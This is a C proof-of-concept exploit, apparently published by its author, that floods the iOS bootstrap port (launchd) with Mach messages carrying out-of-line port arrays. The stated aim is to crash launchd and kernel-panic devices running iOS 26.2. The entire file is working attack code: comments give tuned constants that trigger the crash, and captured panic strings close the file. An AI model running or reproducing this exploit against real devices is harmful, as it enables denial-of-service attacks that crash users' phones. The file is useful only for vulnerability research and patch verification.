/*
 * (useless) poc.c
 * works on iOS 26.2 (23C55)
 * doesn't work on sim i don't know why
 * Jian Lee (@speedyfriend433)
 */

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
//#include <mach/message.h>
//#include "bootstrap.h"
//#include <mach/task_special_ports.h>

#define PORT_COUNT 67 // 67 was enough to trigger -> hack different server won't like this xd

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    char padding[67]; // 67 was enough
} panic_msg_t;

int main(void) {
    kern_return_t kr;
    printf("port array (%lu bytes)...\n", sizeof(mach_port_t) * PORT_COUNT);
    mach_port_t *ports = malloc(sizeof(mach_port_t) * PORT_COUNT);
    mach_port_t fake_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
//    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_port);
//    mach_port_deallocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE)
    mach_port_insert_right(mach_task_self(), fake_port, fake_port, MACH_MSG_TYPE_MAKE_SEND);
    
    for (int i = 0; i < PORT_COUNT; i++) {
        ports[i] = fake_port;
    }

    panic_msg_t msg;
    
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(panic_msg_t);
    msg.header.msgh_local_port = MACH_PORT_NULL;

    mach_port_t bootstrap_port; /*
                                 com.apple.mobilecheckpoint.checkpointd
                                 com.apple.mobile.installd
                                 https://github.com/speedyfriend433/iOS-26-Reachable-Mach-Services/blob/e2e6a0c9a5221ab23ed3c43bf9d106f103952632/Reachable%20Mach%20Services.txt#L171C1-L172C26
                                 */
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        printf("failed to get bootstrap: 0x%x\n", kr);
        free(ports);
        return 1;
    }
    msg.header.msgh_remote_port = bootstrap_port;
    msg.header.msgh_id = 0x67676767;
    msg.body.msgh_descriptor_count = 1;
    msg.ool_ports.address = (void *)ports;
    msg.ool_ports.count = PORT_COUNT;
    msg.ool_ports.deallocate = FALSE;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ool_ports.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
//    MACH_MSG_TYPE_MAKE_SEND; O
//    MACH_MSG_TYPE_COPY_SEND; X
//    MACH_MSG_TYPE_MOVE_RECEIVE; X
//    MACH_MSG_TYPE_COPY_RECEIVE; X
//    MACH_MSG_TYPE_MOVE_SEND_ONCE; X
//    MACH_MSG_TYPE_MAKE_SEND_ONCE; X
//
    
    
    
    
    printf("good bye launchd\n");
    
    for (int i = 0; i < 670; i++) { // after hundreds of attempts, figured out that 670 was enough
        kr = mach_msg(
            &msg.header,
            MACH_SEND_MSG,
            msg.header.msgh_size,
            0,
            MACH_PORT_NULL,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL
        );
        
        if (kr != KERN_SUCCESS) {
            // printf("[-] Send failed: 0x%x\n", kr);
        } else {
            if (i % 100 == 0) printf("."); // pretty sure device will panic after 2~3 seconds if apple didn't patch it
                                            /// i think apple will patch this in iOS 26.3 since i open sourced it
        }
    }
    
    printf("\n[*] spray done :D device panic?\n"); // won't even reach
    
    free(ports);
    return 0;
}



/*
 "panicString" : "panic(cpu 1 caller 0xfffffff02fd8edc0):  initproc exited -- exit reason namespace 1 subcode 0x7 description: none
 "panicString" : "panic(cpu 5 caller 0xfffffff0288d22e4):  initproc exited -- exit reason namespace 1 subcode 0x7 description: none
 */
